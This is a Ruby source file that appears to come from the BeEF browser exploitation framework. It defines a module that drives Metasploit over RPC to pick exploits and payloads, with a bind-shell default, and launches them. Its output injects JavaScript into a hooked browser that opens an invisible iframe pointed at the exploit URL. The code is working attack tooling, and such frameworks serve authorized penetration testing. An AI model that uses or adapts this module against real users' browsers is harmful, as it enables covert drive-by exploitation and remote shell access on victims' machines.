module BeEF
module Modules
module Commands

  class Msf < BeEF::Core::Command
  
    def initialize
      super({
        'Name' => 'Generic Metasploit Exploit',

        'Description' => %Q{
          This module will launch a Metasploit exploit against the host
          },
        'Category' => 'Metasploit',
        'Author' => ['sussurro'],
        'Data' => [ ], 
        'File' => __FILE__,
      })

      use 'beef.dom'
    end
  
    def callback
      save({'result' => @datastore['result']})
    end
  
    # 
  	def update_info(id)
  		mod = BeEF::Core::Models::CommandModule.first(:id => id)
  		msfinfo = nil
      targets = []
    
  		if mod.dynamic_command_info == nil  
  			msf = BeEF::Extension::Metasploit::RpcClient.instance
  			msf.login()
  			msfinfo = msf.get_exploit_info(mod.name)
      
  		  st = mod.name.split('/').first
  		  puts "st: " + st
      
  			os_name = BeEF::Core::Constants::Os::match_os(st)

  			browsers =  BeEF::Core::Constants::Browsers::match_browser(msfinfo['name'] + msfinfo['targets'].to_json)

        targets << {'os_name' => os_name, 'browser_name' => 'ALL', 'verified_status' =>
                              BeEF::Core::Constants::CommandModule::VERIFIED_UNKNOWN} if browsers.count == 0

        browsers.each do |bn|
          targets << {'os_name' => os_name, 'browser_name' => bn, 'verified_status' =>
                        BeEF::Core::Constants::CommandModule::VERIFIED_WORKING
                     }
        end

        targets << {'os_name' => "ALL", 'verified_status' => BeEF::Core::Constants::CommandModule::VERIFIED_NOT_WORKING}
      
  		  mod.dynamic_command_info = BeEF::Core::Models::DynamicCommandInfo.new( 
  				 :name => msfinfo['name'],
  				 :description => msfinfo['description'],
  				 :targets => targets.to_json)
  			mod.save
  		else
  			msfinfo = mod.dynamic_command_info
  			targets = JSON.parse(msfinfo['targets'])
  		end
		
  		@info['Name'] = msfinfo['name']
  		@info['Description'] = msfinfo['description']
  		@info['MsfModName'] = mod.name
  		@info['mod-id'] = mod.id
  		@info['msfid'] = mod.name
  		@target = targets
  	end
	
  	def update_data()
      modname = @info['MsfModName']
    
      msf = BeEF::Extension::Metasploit::RpcClient.instance
      if not msf.is_enabled
  			@info['Description'] += "<BR>" + "*"*15 + "WARNING" + "*"*15 + "<BR>"
  			@info['Description'] += "Metasploit capapbilities have been disabled, please verify your configuration or if msf_enabled = 1 then check the BeEF console for errors"
  			return
  		end
		
  		msfoptions = msf.get_options(modname)
		
  		msfoptions.keys.each { |k|
  			next if msfoptions[k]['advanced'] == true
  			next if msfoptions[k]['evasion'] == true
  			
  		  @info['Data'] << { 'name' => k + '_txt', 'type' => 'label', 'text' => msfoptions[k]['desc']}
  		  
  		  case msfoptions[k]['type']
  		    when "string","address","port"
  				  msfoptions[k]['default'] = rand(32**20).to_s(32)  if k == "URIPATH"
  				  @info['Data'] << {'name' => k , 'ui_label' => k, 'value' => (oc_value(k) ||  msfoptions[k]['default'])}
  			  when "bool"
  				  @info['Data'] <<  {'name' => k, 'type' => 'checkbox', 'ui_label' => k }
  		    when "enum"
  				  enumdata = []
  				  msfoptions[k]['enums'].each { |e|
  						enumdata << [e]
  				  }
  			    @info['Data'] << { 'name' => k, 'type' => 'combobox', 'ui_label' => k, 'store_type' => 'arraystore', 'store_fields' => ['enum'], 'store_data' => enumdata, 'valueField' => 'enum', 'displayField' => 'enum' , 'autoWidth' => true, 'mode' => 'local', 'value' => (oc_value(k) || msfoptions[k]['default'])}
  			end
  		}

      msfpayloads = msf.get_payloads(modname)
    
      return if not msfpayloads or not msfpayloads['payloads']

      payloads = msfpayloads['payloads']
    
      pl = []
      pl << [(oc_value('PAYLOAD') || 'generic/shell_bind_tcp')] 

      payloads.each { |p|
  			pl << [p]
      }

    	@info['Data'] << { 'name' => 'PAYLOAD', 
    	  'type' => 'combobox', 
    		'anchor' => '95% -100',
    		'ui_label' => 'Payload',
    		'store_type' => 'arraystore', 
    		'store_fields' => ['payload'], 
    		'store_data' => pl, 
    		'valueField' => 'payload', 
    		'displayField' => 'payload' , 
    		'autoWidth' => true,
    		'mode' => 'local',
    		'reloadOnChange' => true, # reload payloads
        'defaultPayload' => "generic/shell_bind_tcp", # default combobox value
        'defaultPayload' => "generic/shell_bind_tcp",
    		'emptyText' => "select a payload..."
    	}
    
      @info['Data'] << { 'name' => 'mod_id' , 'id' => 'mod_id', 'type' => 'hidden', 'value' => @info['mod-id'] }		
  	end

    def get_payload_options(payload_name)
      # get payload options from metasploit
    	msf_xmlrpc_clinet = BeEF::Extension::Metasploit::RpcClient.instance
  		msf_xmlrpc_clinet.login()
      payload_options = msf_xmlrpc_clinet.payload_options(payload_name)
    
      info = {}
      info['Data'] = []

  	  payload_options.keys.each { |k|
  			next if payload_options[k]['advanced'] == true
  			next if payload_options[k]['evasion'] == true
  		    info['Data'] << { 'name' => k + '_txt', 'type' => 'label', 'text' => payload_options[k]['desc']}
  		  case payload_options[k]['type']
  		  when "string","address","port","raw","path", "integer"
  				payload_options[k]['default'] = "127.0.0.1" if k == "RHOST"
  				info['Data'] << {'name' => k , 'ui_label' => k, 'value' => (oc_value(k) || payload_options[k]['default'])}
  			when "bool"
  				info['Data'] <<  {'name' => k, 'type' => 'checkbox', 'ui_label' => k }
  		  when "enum"
  				info['Data'] << { 'name' => k, 'type' => 'combobox', 'ui_label' => k, 'store_type' => 'arraystore', 'store_fields' => ['enum'], 'store_data' => payload_options[k]['enums'], 'valueField' => 'enum', 'displayField' => 'enum' , 'autoWidth' => true, 'mode' => 'local', 'value' => (oc_value(k) || payload_options[k]['default'])}
  			else
  			  # Debug output if the payload option type isn't found
  				puts "K => #{k}\n"
  				puts "Status => #{payload_options[k]['advanced']}\n"
  				puts "Type => #{payload_options[k]['type']}\n"
  				puts payload_options[k]
  			end
  		}
    
      # turn results into JSON
      payload_options_json = []
      payload_options_json[1] = JSON.parse(info.to_json)
    
      JSON.parse(info.to_json)
    
    end
  
    def launch_exploit(opts)
  		msf = BeEF::Extension::Metasploit::RpcClient.instance
  		msf.login()
  		ret = msf.launch_exploit(@info['msfid'],opts)
  		@output = "<script>alert('#{ret['uri']}')</script>\n" if ret['result'] == 'success'
  		ret
  	end

  	def output
    	if @datastore
    		@datastore['command_url'] = BeEF::Core::Server.instance.get_command_url(@default_command_url)
    		@datastore['command_id'] = @command_id
  	  end

      return "	
beef.execute(function() {
        var result; 

        try { 
                var sploit = beef.dom.createInvisibleIframe();
                sploit.src = '#{datastore['sploit_url']}';
        } catch(e) { 
                for(var n in e) 
                        result+= n + ' '  + e[n] ; 
        } 

});"
  	end
	
    def callback
  		content = {}
  		content['Exploit Results'] = @datastore['result']
  		save content
  	end
  end

end
end
end


